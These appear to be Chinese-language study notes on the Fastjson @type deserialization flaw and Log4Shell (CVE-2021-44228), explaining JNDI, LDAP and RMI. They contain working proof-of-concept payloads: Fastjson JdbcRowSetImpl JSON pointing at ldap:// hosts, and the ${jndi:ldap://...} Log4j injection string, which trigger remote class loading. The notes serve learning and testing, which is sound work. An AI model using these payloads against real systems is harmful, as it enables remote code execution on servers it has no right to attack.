
构造请求
{
  "@type": "java.lang.Exception",
  "message": "fastjson_test"
}

---
POST / HTTP/1.1

Content-Type: application/json

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36

Accept: */*

Host: 127.0.0.1:8090

Content-Length: 26


{"name":"hello", "age":20}
  
curl -X POST http://127.0.0.1:8090/ -H "Content-Type: application/json" --data "{\"name\":\"hello\", \"age\":20}"

---
响应包特征：com.alibaba.fastjson

fastjson 支持一个特性：在JSON里加 `@type` 字段，告诉fastjson反序列化时，把这个JSON当作哪个Java类来处理。
- 反序列化的**自动加载类**，一旦没有严格限制，攻击者就可以构造带`@type`的JSON，告诉fastjson去加载**任意类**。
    
- 如果加载的类带有“恶意的代码执行”或“触发远程加载”的方法，反序列化过程就会**执行攻击代码**。


构造payload带@type字段，指定恶意类，比如com.sun.rowset.JdbcRowSetImpl。 利用该类的特性，触发服务器发起远程连接（LDAP、RMI、HTTP），加载远程恶意Java字节码。

com.sun.rowset.JdbcRowSetImpl
- 这个类支持通过反序列化时读取`dataSourceName`字段，**触发JNDI连接**。
    
- 攻击者构造的payload中，`dataSourceName`字段填入一个JNDI地址（比如LDAP或RMI服务地址）。
    
- 反序列化时，`JdbcRowSetImpl`尝试连接该JNDI地址，加载远程恶意Java对象。


## 1. JNDI（Java Naming and Directory Interface）

- Java官方提供的API，作用是让Java程序能**查找和访问命名和目录服务中的资源**。
    
- 换句话说，它是一套统一的接口规范，程序可以通过JNDI访问各种目录服务（LDAP、RMI注册表、DNS等）。
    
- 关键点：JNDI本身不做协议实现，只是“桥梁”，不同服务端用不同协议。
    
- 在反序列化攻击中，JNDI被用来查找恶意的远程对象，进而触发远程代码加载。
    

---

## 2. LDAP（Lightweight Directory Access Protocol）

- 一种基于目录服务的协议，专门用来查询和修改目录信息，比如用户、设备信息。
    
- JNDI常用LDAP作为底层协议去访问目录服务。
    
- 在攻击中，攻击者搭建一个恶意LDAP服务器，当JNDI通过LDAP查找时，LDAP服务器返回恶意Java对象的引用。
    
- **这个恶意对象就是攻击载体，能被目标JVM加载并执行。**
    

---

## 3. RMI（Remote Method Invocation）

- Java专用的远程过程调用协议，允许Java程序调用另一台Java虚拟机上的对象方法。
    
- RMI本身包含了注册表服务，类似目录服务，可以配合JNDI被访问。
    
- 反序列化攻击中，JNDI可以通过RMI协议访问远程对象，触发远程代码执行。
    

---

## 它们的联系和攻击流程（直白图解）

`Fastjson反序列化时遇到 @type=com.sun.rowset.JdbcRowSetImpl     
			↓ 
JdbcRowSetImpl的dataSourceName字段被设置为 ldap://attacker_ldap_server/Exploit      
			↓ 
fastjson触发JNDI去LDAP服务器查找这个对象      
			↓ 
恶意LDAP服务器返回恶意Java类字节码引用      
			↓ 
目标JVM加载并执行这个恶意字节码      
			↓ 
	   实现远程代码执行`

---

- **JNDI是访问各种命名服务的接口，包括LDAP、RMI。**
    
- **LDAP、RMI是JNDI常用的底层协议。**
    
- **反序列化攻击就是利用JNDI协议访问恶意服务，拿到远程恶意代码，实现RCE。**


各种版本poc
1.2.24-1.2.43
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://127.0.0.1/123","autoCommit":true}

1.2.9-1.2.47
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://127.0.0.1:8081/123.txt",
        "autoCommit":true
    }
}














log4j组件
# 三、CVE-2021-44228

## 漏洞简介：

log4j支持JNDI协议。

Apache Log4j2是一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。

## 漏洞原理

攻击者构造payload，在JNDI接口lookup查询进行注入，payload为${jndi:ldap:恶意url/poc}，JNDI会去对应的服务（如LDAP、RMI、DNS、文件系统、目录服务…本例为ldap）查找资源，由于lookup的出栈没做限制，最终指向了攻击者部署好的恶意站点，下载了远程的恶意class，最终造成了远程代码执行rce。

  

**log4j2框架下的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。**

  

**攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，造成了远程代码执行（可反弹shell到指定服务器）。**

log4j是一款通用日志记录工具，开发人员可以使用log4j对当前程序状态进行记录。log4j的功能非常强大，开发人员除了直接记录文本外，还可以使用简单表达式记录动态内容，例如：

```
logger.info("system propety: ${sys:user.dir}");
```

## lookup功能：

Lookup 是一种查找机制，用于动态获取和替换日志记录中的变量或属性的值。它提供了一种灵活的方式，可以在日志消息中引用、解析和插入各种上下文相关的信息。

**log4j中除了sys解析器外，还有很多其他类型的解析器。其中，jndi 解析器就是本次漏洞的源头。**

## JNDI解析器：

JND**全称为Java命名和目录接口，**提供了命名服务和目录服务，**允许从指定的远程服务器获取并加载对象，JNDI注入攻击时常用的就是通过RMI和LDAP两种服务。**

正常的包含jndi的日志记录方式如下：

```
logger.info("system propety: ${jndi:schema://url}");
```

log4j2框架下的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。

**jdk将从url指定的路径下载一段字节流，并将其反序列化为Java对象，作为jndi返回。反序列化过程中，即会执行字节流中包含的程序。**

**攻击者如何控制服务器上记录的日志内容呢？**

大部分web服务程序都会对用户输入进行日志记录。例如：用户访问了哪些url，有哪些关键的输入等，都会被作为参数送到log4j中，我们在这些地方写上 ${jndi:ldap://xxx.dnslog.cn}就可以使web服务从xxx.dnslog.cn下载字节流了。

## ldap服务：

```
LDAP(轻型目录访问协议)是一个开放的，中立的，工业标准的应用协议，
通过IP协议提供访问 控制和维护分布式信息的目录信息。
```

目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈 树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。

## RMI：

RMI（远程方法调用）：它是一种机制，能够让在某个java虚拟机上的对象调用另一个Java虚拟机 的对象的方法。


nslookup — 日志查询模块
jndi接口
rmi+ldap 协议(加载并执行这个对象) -- .jar
http https (html+js+css)


